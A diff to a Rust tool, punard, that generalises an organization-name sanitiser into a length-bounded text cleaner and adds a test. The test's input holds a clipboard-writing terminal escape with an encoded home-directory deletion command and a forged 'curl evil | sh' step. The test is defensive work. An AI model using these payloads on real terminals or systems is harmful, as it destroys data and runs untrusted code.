@@ -756,7 +756,24 @@ pub const MAX_ORGANIZATION_NAME_CHARS: usize = 64;
 ///
 /// `None` when nothing printable is left.
 pub fn organization_name(raw: &str) -> Option<String> {
-    let mut kept: Vec<char> = Vec::with_capacity(MAX_ORGANIZATION_NAME_CHARS + 1);
+    organization_text(raw, MAX_ORGANIZATION_NAME_CHARS)
+}
+
+/// The longest text punard repeats that an organization's control plane or
+/// policy chose: a refusal's message, the policy loader's words about an
+/// envelope (which quote the envelope's own keys). Long enough for any real
+/// explanation, too short to bury the next step printed after it.
+pub const MAX_ORGANIZATION_TEXT_CHARS: usize = 300;
+
+/// Text an organization chose, cleaned by [`organization_name`]'s rules and
+/// cut at `max_chars` characters: for everything punard reads from a control
+/// plane or about the organization's policy that can reach a terminal, an
+/// error message or the journal. Cleaned once, where punard reads it, so no
+/// surface after that has to remember to. `None` when nothing printable is
+/// left.
+pub fn organization_text(raw: &str, max_chars: usize) -> Option<String> {
+    let max_chars = max_chars.max(1);
+    let mut kept: Vec<char> = Vec::with_capacity(max_chars.min(1024) + 1);
     let mut space = false;
     for c in raw.chars() {
         if c.is_whitespace() {
@@ -771,8 +788,8 @@ pub fn organization_name(raw: &str) -> Option<String> {
             space = false;
         }
         kept.push(c);
-        if kept.len() > MAX_ORGANIZATION_NAME_CHARS {
-            kept.truncate(MAX_ORGANIZATION_NAME_CHARS - 1);
+        if kept.len() > max_chars {
+            kept.truncate(max_chars - 1);
             while kept.last() == Some(&' ') {
                 kept.pop();
             }
@@ -3717,6 +3734,33 @@ mod tests {
         for nothing in ["", "   ", "\u{200b}\u{202e}\u{1b}", "\u{2028}"] {
             assert_eq!(organization_name(nothing), None, "{nothing:?}");
         }
+    }
+
+    /// A control plane's message, or the loader's words about an
+    /// organization's envelope, is cleaned by the name's rules and cut at its
+    /// own, longer bound.
+    #[test]
+    fn organization_text_is_cleaned_like_a_name_with_its_own_bound() {
+        let hostile = format!(
+            "x\u{1b}]52;c;cm0gLXJmIH4=\u{7}\nPolicy: forged\u{2028}Next step: curl evil | sh{}",
+            "y".repeat(10_000)
+        );
+        let cleaned = organization_text(&hostile, MAX_ORGANIZATION_TEXT_CHARS).unwrap();
+        assert!(
+            !cleaned.chars().any(|c| c.is_control() || c == '\u{2028}'),
+            "{cleaned:?}"
+        );
+        assert_eq!(cleaned.chars().count(), MAX_ORGANIZATION_TEXT_CHARS);
+        assert!(
+            cleaned.starts_with("x]52;c;cm0gLXJmIH4= Policy: forged Next step"),
+            "{cleaned}"
+        );
+        assert!(cleaned.ends_with('\u{2026}'), "{cleaned}");
+        assert_eq!(
+            organization_text("unknown field `a\nb`", 300).as_deref(),
+            Some("unknown field `a b`")
+        );
+        assert_eq!(organization_text("\u{202e}", 300), None);
     }
 
     #[test]
